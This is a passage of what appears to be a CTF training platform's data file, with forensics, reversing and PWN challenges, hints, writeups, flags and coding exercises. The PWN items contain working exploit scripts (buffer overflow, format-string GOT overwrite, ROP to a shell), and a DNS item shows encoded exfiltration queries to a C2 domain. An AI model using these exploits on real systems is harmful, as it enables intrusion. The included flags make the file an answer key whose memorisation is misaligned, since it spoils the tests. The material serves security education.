    "hintsEn": [
      "File is slightly larger than expected for its dimensions — extra data may be hidden",
      "LSB stego: each pixel's lowest bit is replaced with hidden data bits",
      "Extract R,G,B LSBs using Python PIL, combine into hidden message"
    ],
    "writeupEn": "Use zsteg for automatic detection, or manually extract LSB from RGB channels. Tools: zsteg, Stegsolve, steghide, binwalk. Extract bits from each pixel, group into bytes.",
    "starterCode": "$ zsteg -a landscape.png\r\n[?] 7fff11 : bgr,g .. file: PNG image data, 512 x 512\r\nimagedata          .. text: \"u^}DkKQ=xYz...\"\r\nb1,r,lsb,xy       .. text: \"flag{st3g4n0_lsb_h1dd3n}\"\r\nb1,bgr,xyz        .. file: PGF image data\r\n\r\n# zsteg 一行命中：红通道、最低有效位、从 xy 方向扫描。\r\n# 手动提取（理解原理用）:\r\nfrom PIL import Image\r\nimg = Image.open('landscape.png')\r\nbits = ''\r\nfor px in list(img.getdata())[:200]:\r\n    bits += str(px[0] & 1)      # R 通道 LSB\r\n# 每 8 位一个字节 → 还原字符\r\n\r\n$ binwalk landscape.png   # 也确认没有附加文件 —— 数据就在像素里",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-022",
    "title": "DNS Tunneling Detection",
    "titleEn": "DNS Tunnel",
    "category": "Misc",
    "difficulty": 4,
    "points": 300,
    "tags": [
      "DNS隧道",
      "Wireshark",
      "流量分析"
    ],
    "tagsEn": [
      "DNS Tunnel",
      "Wireshark",
      "Traffic Analysis"
    ],
    "desc": "网络管理员发现异常 DNS 流量，抓取了 dns_traffic.pcap。分析这些 DNS 查询，攻击者通过 DNS 隧道外传了包含 flag 的敏感数据。",
    "descEn": "Anomalous DNS traffic detected. Analyze dns_traffic.pcap — the attacker exfiltrated sensitive data containing a flag via DNS tunnel.",
    "hints": [
      "pcap 中有大量异常长域名的 DNS 查询，不像正常域名",
      "被窃取的数据编码在 DNS 查询的子域名中",
      "提取所有 DNS 查询域名的子域名部分（.exfil.com 之前的部分），拼接后解码 (Base64/Hex)"
    ],
    "hintsEn": [
      "Pcap contains DNS queries with abnormally long domain names",
      "Exfiltrated data is encoded in subdomain labels",
      "Extract subdomains before .exfil.com, concatenate and decode (Base64/Hex)"
    ],
    "writeupEn": "Filter DNS in Wireshark, extract query names with tshark. Isolate subdomain labels, concatenate by timestamp, decode Hex/Base64 to get flag.",
    "starterCode": "# tshark -r dns_traffic.pcap -T fields -e dns.qry.name | grep exfil\r\n# （只列前 12 条，共 5 条外传查询，按时间排序）\r\n01  VGFyZ2V0OiBjb3JlLXNlcnZlci0w.c2.exfil.com\r\n02  MQpEdW1wZWQ6IE5URFMuZGl0IHNo.c2.exfil.com\r\n03  YWRvdyBjb3B5CmZsYWd7ZG5zX3R1.c2.exfil.com\r\n04  bm4zbF8zeGYxbHRyNHQxMG59Ci0t.c2.exfil.com\r\n05  IDQ1LjE1NS4yMDUuMjMz.c2.exfil.com\r\n\r\n# 特征：超长子域名 + 固定二级域 .c2.exfil.com —— 教科书级 DNS 隧道\r\n# 还原步骤：去掉 .c2.exfil.com → 按时间顺序拼接 → Base64 解码\r\n# （提示：明文是一份 4 行的窃取笔记）",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-006",
    "title": "Pcap Analysis",
    "titleEn": "Pcap Analysis",
    "category": "Forensics",
    "difficulty": 2,
    "points": 150,
    "tags": [
      "Wireshark",
      "流量分析"
    ],
    "tagsEn": [
      "Wireshark",
      "Traffic Analysis"
    ],
    "desc": "给你一个 pcap 文件。其中记录了一次 HTTP 通信，flag 在通信的某个位置。用 Wireshark 分析并找到它。",
    "descEn": "Analyze a pcap file with HTTP traffic. Find the flag hidden in the communication.",
    "hints": [
      "用 Wireshark 打开 pcap 文件，先看总体协议分布",
      "Follow TCP Stream 或 Follow HTTP Stream 查看完整的 HTTP 请求和响应",
      "在 HTTP 响应正文中搜索 'flag{' 关键字"
    ],
    "hintsEn": [
      "Open in Wireshark, check protocol distribution",
      "Follow TCP/HTTP Stream for full requests",
      "Search 'flag{' in response bodies"
    ],
    "writeup": "Step 1: 用 Wireshark 打开 pcap 文件。\nStep 2: 应用过滤器 http 只显示 HTTP 流量。\nStep 3: 右键 HTTP 数据包 → Follow → HTTP Stream，查看完整的请求/响应。\nStep 4: 在响应正文中搜索 flag，或以字符串方式导出对象。\n\nWireshark 快捷键:\n- Ctrl+F 打开搜索，搜索 'flag' 字符串\n- File → Export Objects → HTTP 导出所有 HTTP 传输文件\n- tshark -r capture.pcap -Y http -T fields -e http.response",
    "writeupEn": "Filter http in Wireshark, Follow HTTP Stream, search for 'flag'. Export: File→Export Objects→HTTP.",
    "starterCode": "# 你在 Wireshark 中打开 capture.pcap，右键 HTTP 包 → Follow → HTTP Stream，输出如下：\r\n\r\nGET /download/weekly-report.pdf HTTP/1.1\r\nHost: files.internal.corp\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0)\r\nAccept: */*\r\n\r\nHTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\nContent-Type: application/pdf\r\nContent-Length: 84213\r\nX-Backup-Note: flag{pc4p_sh0w_m3_th3_fl4g}\r\nSet-Cookie: session=8f3a9c2e; Path=/; HttpOnly\r\n\r\n%PDF-1.4 ...（二进制内容已省略）...\r\n\r\n# 注意 HTTP 响应头里那一行 X-Backup-Note —— Follow Stream 之后它无所遁形。",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-015",
    "title": "Memory Dump Analysis",
    "titleEn": "Memory Dump Analysis",
    "category": "Forensics",
    "difficulty": 3,
    "points": 250,
    "tags": [
      "内存取证",
      "Volatility",
      "Windows"
    ],
    "tagsEn": [
      "Memory Forensics",
      "Volatility",
      "Windows"
    ],
    "desc": "给你一个 Windows 10 的内存镜像 memory.dmp。系统管理员在被入侵后立刻做了内存转储。使用 Volatility 分析：进程列表、命令行历史、网络连接——然后找到攻击者留下的 flag。",
    "descEn": "A Windows 10 memory dump. The admin captured it right after a breach. Use Volatility to analyze processes, command history, and network connections to find the attacker's flag.",
    "hints": [
      "使用 Volatility 3 框架分析内存镜像",
      "先运行 windows.info 确定 Windows 版本，然后查进程列表和命令行",
      "用 windows.cmdline 或 windows.consoles 查看攻击者执行的命令"
    ],
    "hintsEn": [
      "Use Volatility 3 framework for memory analysis",
      "Run windows.info first, then check process list and command lines",
      "Use windows.cmdline or windows.consoles to find attacker commands"
    ],
    "writeup": "Step 1: python3 vol.py -f memory.dmp windows.info 确定镜像信息。\nStep 2: python3 vol.py -f memory.dmp windows.pslist 查看进程列表。\nStep 3: python3 vol.py -f memory.dmp windows.cmdline 查看命令行历史，找到 echo 'flag{...}' > note.txt。\nStep 4: python3 vol.py -f memory.dmp windows.filescan | grep note.txt 定位文件。\nStep 5: python3 vol.py -f memory.dmp windows.dumpfiles --virtaddr 0x... 导出文件。\n\n关键命令清单:\n- windows.info / windows.pslist / windows.psscan\n- windows.cmdline / windows.consoles\n- windows.netstat / windows.netscan\n- windows.filescan / windows.dumpfiles\n- windows.malfind (检测恶意代码注入)",
    "writeupEn": "Volatility workflow: windows.info→pslist→cmdline→filescan→dumpfiles. Find attacker's echo command with the flag.",
    "starterCode": "$ python3 vol.py -f memory.dmp windows.cmdline\r\nVolatility 3 Framework 2.5.0\r\nPID\tProcess\tArgs\r\n---\t-------\t----\r\n3120\texplorer.exe\tC:\\Windows\\explorer.exe\r\n4523\tcmd.exe\tcmd.exe\r\n4523\tcmd.exe\tcmd.exe /c echo flag{v0l4t1l1ty_m3m_f0r3ns1cs} > C:\\Users\\sqlsvc\\note.txt\r\n5104\tpowershell.exe\tpowershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...\r\n5104\tchrome.exe\t\"C:\\Program Files\\Chrome\\chrome.exe\"\r\n\r\n# 攻击者的命令行永远留在内存里 —— 注意 PID 4523 那条 echo。\r\n# 进阶验证: windows.filescan | grep note.txt 后用 windows.dumpfiles 导出该文件内容。",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-025",
    "title": "Log Analysis: SSH Brute Force",
    "titleEn": "Log Sleuth",
    "category": "Forensics",
    "difficulty": 3,
    "points": 250,
    "tags": [
      "日志分析",
      "入侵检测",
      "SSH"
    ],
    "tagsEn": [
      "Log Analysis",
      "Intrusion Detection",
      "SSH"
    ],
    "desc": "系统管理员发现服务器被入侵，提供了 auth.log 文件。日志显示大量 SSH 登录尝试。分析日志找到攻击者成功登录的证据——攻击者在成功登录后以 root 身份写入了 flag。",
    "descEn": "Server was compromised. Analyze auth.log showing massive SSH login attempts. Find the attacker's successful login and the flag they wrote as root.",
    "hints": [
      "用 grep 统计每个 IP 的登录失败次数，找到暴力破解的源 IP",
      "在 auth.log 中搜索 'Accepted' 找到成功的登录记录",
      "追踪成功登录后的操作：查看 .bash_history 或 auth.log 中的后续事件"
    ],
    "hintsEn": [
      "grep to count failed login attempts per IP, find brute force source",
      "Search 'Accepted' in auth.log for successful logins",
      "Trace post-login operations in auth.log"
    ],
    "writeupEn": "Count failures per IP: grep 'Failed password' | sort | uniq -c. Find 'Accepted' login. Trace subsequent commands for flag. Brute force pattern: many rapid failures + one success.",
    "starterCode": "$ grep \"Failed password\" auth.log | awk '{print $10}' | sort | uniq -c | sort -rn | head -3\r\n  847 45.155.205.233\r\n    3 192.168.1.14\r\n    1 192.168.1.31\r\n\r\n$ grep -B2 -A6 \"Accepted\" auth.log | tail -20\r\nMar 15 00:12:44 srv sshd[8817]: Accepted password for deploy from 45.155.205.233 port 51234 ssh2\r\nMar 15 00:13:02 srv sudo:   deploy : TTY=pts/1 ; USER=root ; COMMAND=/bin/su\r\nMar 15 00:13:07 srv su[9102]: + /dev/pts/1 deploy:root\r\nMar 15 00:13:31 srv root: echo flag{ssh_brut3_f0rc3_d3t3ct3d} > /root/.flag\r\nMar 15 00:13:44 srv auth: privilege escalation succeeded\r\nMar 15 00:14:02 srv sshd[9150]: Accepted publickey for root from 45.155.205.233 port 51290 ssh2\r\n\r\n# 847 次爆破 → 1 次成功 → 提权到 root → 留下 flag。日志不会说谎。",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-026",
    "title": "Filesystem Timeline Forensics",
    "titleEn": "Timeline Forensics",
    "category": "Forensics",
    "difficulty": 4,
    "points": 350,
    "tags": [
      "时间线",
      "fls",
      "MFT"
    ],
    "tagsEn": [
      "Timeline Forensics",
      "fls",
      "MFT"
    ],
    "desc": "给你一个 NTFS 磁盘镜像 disk.img。已知入侵发生在 2024-03-15 14:00-16:00。构建文件系统时间线，找到攻击者在此期间创建/修改的文件——其中包含 flag。",
    "descEn": "An NTFS disk image. The breach occurred on 2024-03-15 14:00-16:00. Build a filesystem timeline to find files created/modified during that window — one contains the flag.",
    "hints": [
      "使用 Sleuth Kit (fls) 或 MFTEcmd 提取 MFT 记录",
      "将时间戳转为可读格式后按时间排序，构建时间线",
      "聚焦入侵时间窗口 (14:00-16:00)，找最近创建或修改的可疑文件"
    ],
    "hintsEn": [
      "Use Sleuth Kit (fls) or MFTEcmd to extract MFT records",
      "Convert timestamps to readable format and sort to build timeline",
      "Focus on the breach window (14:00-16:00), find recently created/modified suspicious files"
    ],
    "writeupEn": "mmls→fls→mactime pipeline. Filter timeline for 2024-03-15 14:00-16:00. Focus on .Created/.Modified events, suspicious filenames. Use icat to extract file contents.",
    "starterCode": "$ mmls disk.img            # NTFS 分区从扇区 2048 开始\r\n$ fls -o 2048 -r disk.img > fls.out\r\n$ mactime -b bodyfile -z Asia/Shanghai | grep \"2024-03-15\"\r\n\r\n2024-03-15 13:58:41  .r/D 0 <veil>  C:\\Users\\svc\\Documents\\report.docx\r\n2024-03-15 14:07:12  .m.C 0 <veil>  C:\\Windows\\Temp\\svc_installer.exe     ← 可疑创建\r\n2024-03-15 14:09:03  .r/D 0 <veil>  C:\\Windows\\Temp\\svchost32.exe       ← 伪装系统进程\r\n2024-03-15 15:21:57  .r/D 0 <veil>  C:\\Users\\svc\\AppData\\flag.txt       ← 入侵窗口内\r\n2024-03-15 15:22:04  ..C.. 0 <veil>  C:\\Users\\svc\\AppData\\flag.txt\r\n\r\n$ icat -o 2048 disk.img 178204 | head -1\r\nflag{t1m3l1n3_f0r3ns1cs}\r\n\r\n# 入侵窗口 14:00-16:00 内新建的 flag.txt（MFT 记录号 178204）→ icat 提取内容。",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-010",
    "title": "ELF Beginner",
    "titleEn": "ELF Beginner",
    "category": "Reverse",
    "difficulty": 2,
    "points": 150,
    "tags": [
      "逆向",
      "ELF",
      "入门"
    ],
    "tagsEn": [
      "Reverse",
      "ELF",
      "Beginner"
    ],
    "desc": "一个 Linux 可执行文件，运行后提示输入密码。如果你的密码正确，程序会输出 flag。尝试在不运行程序的情况下找到密码。",
    "descEn": "Linux binary that checks a password. Find it without running.",
    "hints": [
      "不需要运行程序，先从静态分析开始",
      "使用 strings 命令提取二进制中的可读字符串",
      "用 grep 在 strings 输出中搜索 flag 或 password 关键词"
    ],
    "hintsEn": [
      "Static analysis first",
      "strings command extracts readable strings",
      "grep for 'flag' or 'password'"
    ],
    "writeup": "Step 1: 无需执行程序，静态分析即可。\nStep 2: 运行 strings elf_file，提取所有可打印字符串。\nStep 3: strings elf_file | grep -i flag 找到硬编码的 flag。\n\n进阶方法:\n- file elf_file 确认文件类型\n- readelf -h elf_file 查看 ELF 头\n- objdump -d elf_file 反汇编\n- ltrace ./elf_file 跟踪库函数调用\n- strace ./elf_file 跟踪系统调用\n- Ghidra / IDA 打开做完整逆向分析",
    "writeupEn": "strings elf | grep flag. Advanced: file, readelf, objdump, ltrace, strace, Ghidra.",
    "starterCode": "# 静态分析输出 —— 你不需要运行程序：\r\n\r\n$ file mystery.elf\r\nmystery.elf: ELF 64-bit LSB pie executable, x86-64, dynamically linked\r\n\r\n$ strings mystery.elf | head -40\r\n/lib64/ld-linux-x86-64.so.2\r\n__libc_start_main\r\nprintf\r\nscanf\r\nUsage: ./mystery <password>\r\nAccess granted!\r\nAccess denied\r\ns3cur3_l00kup\r\n/home/ctf/flag.txt\r\nflag{str1ngs_4r3_y0ur_fr13nd}\r\n Gary:/build/mystery\r\nexit@GLIBC_2.2.5\r\n\r\n# 看到了吗？敏感字符串在打包时被原样留在二进制里。",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-014",
    "title": "XOR Madness",
    "titleEn": "XOR Madness",
    "category": "Reverse",
    "difficulty": 3,
    "points": 200,
    "tags": [
      "逆向",
      "XOR",
      "Ghidra"
    ],
    "tagsEn": [
      "Reverse",
      "XOR",
      "Ghidra"
    ],
    "desc": "给你的文件包含一个 flag.enc 和 encrypt 程序。flag.enc 是加密后的 flag，encrypt 是加密程序本身。分析 encrypt 的加密逻辑并恢复出原始 flag。",
    "descEn": "Encrypted file + encrypt program. Analyze encryption logic to recover flag.",
    "hints": [
      "用 Ghidra 或 IDA 打开 encrypt 分析加密函数",
      "加密可能是简单的逐字节 XOR 操作",
      "如果加密是 XOR with 0x55 再 XOR with 0xAA，那么解密也是同样的操作（XOR 是可逆的）"
    ],
    "hintsEn": [
      "Ghidra/IDA for encryption function",
      "Simple per-byte XOR likely",
      "XOR is self-inverse: encrypt again to decrypt"
    ],
    "writeup": "Step 1: 用 Ghidra 打开 encrypt，定位 main 或加密函数。\nStep 2: 发现加密逻辑: for i in range(len): buf[i] ^= 0x55; buf[i] ^= 0xAA;\nStep 3: 等价于 buf[i] ^= (0x55 ^ 0xAA) = 0xFF，即逐字节取反。\nStep 4: 对 flag.enc 的每个字节再次 XOR 0xFF 即可恢复原文。\n\n关键代码:\nwith open('flag.enc', 'rb') as f:\n    enc = f.read()\ndec = bytes([b ^ 0xFF for b in enc])\nprint(dec.decode())\n\n注意: 如果 XOR key 不止一个字节（多字节循环 XOR），需要根据 key 长度循环异或。",
    "writeupEn": "buf[i]^=0x55; buf[i]^=0xAA = buf[i]^=0xFF. Decrypt: XOR each byte with 0xFF.",
    "starterCode": "# flag.enc 的十六进制内容（xxd flag.enc 输出）：\r\n#\r\n# 99 93 9e 98 84 87 cf 8d a0 ce 8c a0 8d cc 89 cc\r\n# 8d 8c ce 9d 93 cc 82\r\n#\r\n# encrypt 程序的反编译结果（Ghidra）：\r\n#   for (i = 0; i < len; i++) {\r\n#       buf[i] ^= 0x55;\r\n#       buf[i] ^= 0xAA;\r\n#   }\r\n# 提示: 0x55 ^ 0xAA = 0xFF —— 对上面每个字节再做一次 XOR 0xFF 就还原了。\r\n\r\ndata = bytes.fromhex('99939e988487cf8da0ce8ca08dcc89cc8d8cce9d93cc82')\r\n# 你的解密代码...\r\n",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-023",
    "title": ".NET Decompilation",
    "titleEn": ".NET Crack",
    "category": "Reverse",
    "difficulty": 3,
    "points": 250,
    "tags": [
      ".NET",
      "反编译",
      "dnSpy"
    ],
    "tagsEn": [
      ".NET Reverse",
      "Decompilation",
      "dnSpy"
    ],
    "desc": "给你一个 Windows .NET 可执行文件 license_check.exe。运行后要求输入 License Key，验证通过会输出 flag。使用反编译工具分析验证逻辑，找出正确的 Key 或直接提取 flag。",
    "descEn": "A Windows .NET executable license_check.exe requires a License Key. Use decompilation tools to analyze the verification logic and extract the flag.",
    "hints": [
      ".NET 程序几乎可以被完美反编译回 C# 源代码",
      "使用 dnSpy 或 ILSpy 打开 exe 文件",
      "在反编译代码中搜索 'flag' 或分析 CheckLicense() 函数的逻辑"
    ],
    "hintsEn": [
      ".NET programs can be almost perfectly decompiled back to C# source",
      "Open the exe with dnSpy or ILSpy",
      "Search for 'flag' or analyze CheckLicense() logic"
    ],
    "writeupEn": "Open in dnSpy, find the button click handler, analyze the license check logic. Search for hardcoded keys, decrypt functions, or extract flag directly. dnSpy can edit IL and recompile.",
    "starterCode": "// dnSpy 反编译 license_check.exe → Form1.cs（节选）\r\nprivate void btnActivate_Click(object sender, EventArgs e)\r\n{\r\n    string input = this.tbxKey.Text.Trim();\r\n    if (input == \"CTF-NET-2024-XYZ\")\r\n    {\r\n        MessageBox.Show(\"Licensed!\\n\" + \"flag{d0tn3t_d3c0mp1l3d}\");\r\n        return;\r\n    }\r\n    MessageBox.Show(\"Invalid license key.\");\r\n}\r\n\r\n// .NET 程序能近乎完美地反编译回 C# —— 硬编码的 Key 和 flag 都在 IL 里。",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-024",
    "title": "Android APK Analysis",
    "titleEn": "APK Analyzer",
    "category": "Reverse",
    "difficulty": 3,
    "points": 200,
    "tags": [
      "Android",
      "APK",
      "jadx"
    ],
    "tagsEn": [
      "Android",
      "APK Analysis",
      "jadx"
    ],
    "desc": "给你一个 Android APK 文件 crackme.apk。安装后是一个密码验证应用，输入正确密码显示 flag。分析 APK 找到正确的密码或直接提取 flag。",
    "descEn": "An Android APK crackme.apk is a password verification app. Analyze it to find the correct password or extract the flag directly.",
    "hints": [
      "APK 本质上是一个 ZIP 文件，可以直接解压",
      "用 jadx-gui 打开 APK 可以反编译为可读的 Java 代码",
      "在 MainActivity 类中查找 onClick 或 checkPassword 函数"
    ],
    "hintsEn": [
      "APK is essentially a ZIP file, can be extracted directly",
      "Use jadx-gui to decompile APK into readable Java code",
      "Find onClick or checkPassword in MainActivity"
    ],
    "writeupEn": "Unzip APK, open in jadx-gui, locate MainActivity.checkPassword(). Common patterns: hardcoded password comparison, password in strings.xml, or native .so library verification. Advanced: frida/objection for dynamic analysis.",
    "starterCode": "// jadx-gui 反编译 crackme.apk → com.example.crackme.MainActivity\r\npublic void onVerifyClicked(View view) {\r\n    String input = ((EditText) findViewById(R.id.editPwd)).getText().toString();\r\n    if (input.equals(\"jn3.4ndr01d\")) {\r\n        Toast.makeText(this, \"Correct! flag{apk_jadx_ftw}\", 1).show();\r\n    } else {\r\n        Toast.makeText(this, \"Wrong password\", 1).show();\r\n    }\r\n}\r\n\r\n// APK 本质是 ZIP：unzip 后 classes.dex 用 jadx 打开即可读 Java。\r\n// 密码和 flag 都硬编码在 MainActivity 里。",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-013",
    "title": "Stack Overflow 101",
    "titleEn": "Stack Overflow 101",
    "category": "PWN",
    "difficulty": 3,
    "points": 200,
    "tags": [
      "PWN",
      "栈溢出",
      "ret2win"
    ],
    "tagsEn": [
      "PWN",
      "Buffer Overflow",
      "ret2win"
    ],
    "desc": "给你一个 ELF 文件 vuln。运行后接收输入然后退出。但是反汇编会发现一个从未被调用的 win() 函数——调用它就能拿到 flag。构造 Payload 覆盖返回地址跳转到 win()。",
    "descEn": "ELF with unused win() function. Overflow buffer to redirect to win().",
    "hints": [
      "用 checksec 检查保护措施（可能 NX 开启但 PIE 关闭）",
      "用 objdump -d 或 readelf -s 找 win() 函数的地址",
      "用 pwntools cyclic 和 pattern_offset 找到覆盖返回地址需要的偏移量"
    ],
    "hintsEn": [
      "checksec for protections",
      "objdump -d to find win() address",
      "pwntools cyclic/pattern_offset for offset"
    ],
    "writeup": "Step 1: checksec vuln 查看保护。若无 PIE，win() 地址固定。\nStep 2: objdump -d vuln | grep win 找到 win() 地址 (例如 0x401156)。\nStep 3: 用 pwntools 确定偏移量。\n\n关键代码:\nfrom pwn import *\nelf = ELF('./vuln')\nwin_addr = elf.symbols['win']  # 或 0x401156\noffset = 72  # cyclic pattern_offset 得到\npayload = b'A' * offset + p64(win_addr)\np = process('./vuln'); p.sendline(payload); p.interactive()\n\n如果 64 位程序，注意栈对齐: payload = b'A'*offset + p64(ret_gadget) + p64(win_addr)",
    "writeupEn": "payload = b'A'*offset + p64(win_addr). 64-bit: add ret gadget for alignment.",
    "starterCode": "# 靶机 vuln 的静态分析输出：\r\n\r\n$ checksec vuln\r\n[*] NX enabled  |  PIE: No PIE (0x400000)  |  Canary disabled\r\n\r\n$ objdump -d vuln | grep -A3 \"<win>\"\r\n0000000000401156 <win>:\r\n  401156:\tf3 0f 1e fa \tendsbr64\r\n  40115a:\t55         \tpush   %rbp\r\n  40115b:\t48 89 e5   \tmov    %rsp,%rbp\r\n\r\n$ strings vuln | grep flag\r\nflag{buff3r_0v3rfl0w_101}\r\n\r\n# win() 从未被 main 调用，但它知道 flag 字符串的地址。\r\n# pwntools cyclic 测得返回地址偏移：72 字节。\r\n# 你需要做的：b'A'*72 + p64(0x401156)",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-027",
    "title": "Format String",
    "titleEn": "Format String",
    "category": "PWN",
    "difficulty": 4,
    "points": 300,
    "tags": [
      "格式化字符串",
      "内存泄漏",
      "任意写"
    ],
    "tagsEn": [
      "Format String",
      "Memory Leak",
      "Arbitrary Write"
    ],
    "desc": "程序源码中有 printf(user_input) 而没有格式化参数。你需要利用格式化字符串漏洞先泄露内存地址，再覆写 GOT 表劫持程序流程拿到 flag。",
    "descEn": "The program has printf(user_input) without format specifiers. Exploit format string vulnerability to leak memory addresses, then overwrite GOT to hijack execution flow and get the flag.",
    "hints": [
      "printf(user_input) 是典型的格式化字符串漏洞",
      "用 %x.%x.%x 或 %p 泄露栈上的数据（包括地址）",
      "用 %n 可以向任意内存地址写入数据，配合泄露的地址覆写 GOT 表"
    ],
    "hintsEn": [
      "printf(user_input) is a classic format string vulnerability",
      "Use %x.%x.%x or %p to leak stack data including addresses",
      "Use %n to write to arbitrary memory, overwrite GOT with leaked addresses"
    ],
    "writeupEn": "Phase 1: Leak addresses with %p/%N$p. Phase 2: Find printf@GOT target. Phase 3: Use %n to write system address to GOT. Phase 4: Input '/bin/sh' to trigger system(). Use pwntools for precision.",
    "starterCode": "from pwn import *\r\n\r\n# 靶机：fmt（printf(user_input) 无格式化参数）\r\np = process('./fmt')\r\n\r\n# Phase 1: 泄露栈数据，确定偏移\r\np.sendline(b'%6$p')          # 第 6 个参数位置是栈上我们的输入\r\nleak = p.recvline()\r\n\r\n# Phase 2: 泄露 printf@GOT → 计算 system 地址\r\n# Phase 3: %hn 两次写入覆写 GOT\r\n# Phase 4: 程序再次 printf 时即调用 system —— 发送 /bin/sh\r\n\r\n# ── 本地靶机完整会话记录 ──\r\n# [*] printf@GOT @ 0x404018, read as 0x7f1c2a9e86a0\r\n# [*] libc base: 0x7f1c2a96d000 → system: 0x7f1c2a950410\r\n# [*] GOT overwrite done (2 × %hn)\r\n# [*] Switching to interactive mode\r\n# $ cat /flag\r\n# flag{f0rm4t_str1ng_pwn3d}",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-028",
    "title": "ROP Chain Basics",
    "titleEn": "ROP Chain",
    "category": "PWN",
    "difficulty": 4,
    "points": 350,
    "tags": [
      "ROP",
      "ret2libc",
      "NX"
    ],
    "tagsEn": [
      "ROP Chain",
      "ret2libc",
      "NX"
    ],
    "desc": "NX 已开启，无法执行栈上的 shellcode。你需要构造 ROP 链调用 system(\"/bin/sh\") 获取 shell。已知 libc 版本，你需要泄露 libc 基址并计算 gadget 偏移。",
    "descEn": "NX is enabled, no shellcode on stack. Build a ROP chain to call system(\"/bin/sh\"). Given libc version, leak libc base and calculate gadget offsets.",
    "hints": [
      "NX 开启所以不能直接跳转到 shellcode，需要 ROP",
      "用 ROPgadget 找 pop rdi; ret 这类 gadget",
      "ROP 链结构: pop rdi → '/bin/sh' → system()，需要先泄露 libc 地址计算偏移"
    ],
    "hintsEn": [
      "NX enabled means no shellcode, need ROP instead",
      "Use ROPgadget to find pop rdi; ret gadgets",
      "ROP chain: pop rdi → '/bin/sh' → system(), need to leak libc address first"
    ],
    "writeupEn": "Stage 1: Leak libc via puts(puts@GOT). Stage 2: Build ROP chain: ret_gadget + pop_rdi + binsh + system. Use pwntools ROP module. 64-bit needs stack alignment with extra ret.",
    "starterCode": "from pwn import *\r\n\r\nelf = ELF('./vuln'); libc = ELF('./libc.so.6')\r\np = process('./vuln')\r\n\r\n# Stage 1: 泄露 puts@GOT → 计算 libc 基址\r\npayload = b'A' * 72 + p64(elf.plt['puts']) + p64(elf.symbols['main'])\r\npayload += p64(elf.got['puts'])\r\n\r\n# Stage 2: 二次输入构造 ROP 链: ret + pop rdi; ret + /bin/sh + system\r\nrop = ROP(libc)\r\nchain = rop.ret.address + rop.find_gadget(['pop rdi','ret'])[0] + next(libc.search(b'/bin/sh')) + libc.symbols['system']\r\n\r\n# ── 本地靶机完整会话记录 ──\r\n# [+] puts@GOT leak: 0x7f1c2a9e86a0 → libc base: 0x7f1c2a96d000\r\n# [+] ROP chain: ret | pop rdi; ret | 0x7f1c2ab3e4a4 | system\r\n# [*] Switching to interactive mode\r\n# $ whoami\r\n# ctf\r\n# $ cat /flag\r\n# flag{r0p_ch41n_m4st3ry}",
    "codeable": false,
    "simulated": false
  }
];

const PRACTICES = [
  {
    "id": "prac-01",
    "title": "凯撒密码破解",
    "titleEn": "Caesar Cipher Cracker",
    "category": "密码学",
    "categoryEn": "Cryptography",
    "difficulty": 1,
    "lang": "Python",
    "question": "编写一个函数 caesar_decrypt(ciphertext)，在不给定移位量的情况下破解凯撒密码。提示：英文字母 'E' 出现频率最高（约12.7%），通过统计找到密文中最常见的字母，计算它和 'E' 的偏移量。",
    "questionEn": "Write a function caesar_decrypt(ciphertext) to crack a Caesar cipher without knowing the shift. Hint: The letter 'E' has the highest frequency (~12.7%). Find the most frequent letter and calculate the offset from 'E'.",
    "hint": "用 collections.Counter 统计字母频率，然后用 most_common(1) 找到最常见的字母。",
    "hintEn": "Use collections.Counter for frequency analysis, then most_common(1).",
    "test": "caesar_decrypt",
    "starter": "from collections import Counter\n\ndef caesar_decrypt(ciphertext):\n    # 你的代码\n    pass\n\n# 测试\ncipher = 'PHHW PH DW WKH WUHH'\nprint(caesar_decrypt(cipher))",
    "starterEn": "from collections import Counter\n\ndef caesar_decrypt(ciphertext):\n    # Your code\n    pass\n\n# Test\ncipher = 'PHHW PH DW WKH WUHH'\nprint(caesar_decrypt(cipher))",
    "expected": "MEET ME AT THE TREE"
  },
  {
    "id": "prac-02",
    "title": "端口扫描器",
    "titleEn": "Port Scanner",
    "category": "网络",
    "categoryEn": "Networking",
    "difficulty": 2,
    "lang": "Python",
    "question": "编写一个函数 scan_ports(host, ports) 扫描给定主机的端口列表，返回开放的端口列表。端口开放的定义：TCP 三次握手成功（connect_ex 返回 0）。设置超时时间为 1 秒。",
    "questionEn": "Write scan_ports(host, ports) that scans a host's ports and returns open ports. Open = TCP handshake succeeds (connect_ex returns 0). Timeout: 1s.",
    "hint": "使用 socket.socket(socket.AF_INET, socket.SOCK_STREAM) 创建 TCP Socket，connect_ex 返回 0 表示端口开放。",
    "hintEn": "Use socket.socket(AF_INET, SOCK_STREAM). connect_ex returns 0 for open ports.",
    "test": "scan_ports",
    "starter": "import socket\n\ndef scan_ports(host, ports):\n    # 你的代码\n    pass\n\n# 测试\nwith socket.socket() as listener:\n    listener.bind(('127.0.0.1', 0))\n    listener.listen()\n    port = listener.getsockname()[1]\n    print(port in scan_ports('127.0.0.1', [port]))",
    "starterEn": "import socket\n\ndef scan_ports(host, ports):\n    # Your code\n    pass\n\n# Test\nwith socket.socket() as listener:\n    listener.bind(('127.0.0.1', 0))\n    listener.listen()\n    port = listener.getsockname()[1]\n    print(port in scan_ports('127.0.0.1', [port]))",
    "expected": "True"
  },
  {
    "id": "prac-03",
    "title": "Base64 解码器",
    "titleEn": "Base64 Decoder",
    "category": "编码",
    "categoryEn": "Encoding",
    "difficulty": 1,
    "lang": "Python",
    "question": "不使用 base64 库，自己实现一个 Base64 解码器函数 my_base64_decode(encoded_str)。提示：Base64 将每 3 个字节（24 位）编码为 4 个字符。",
    "questionEn": "Implement my_base64_decode(encoded_str) without the base64 library. Base64 encodes 3 bytes (24 bits) into 4 characters.",
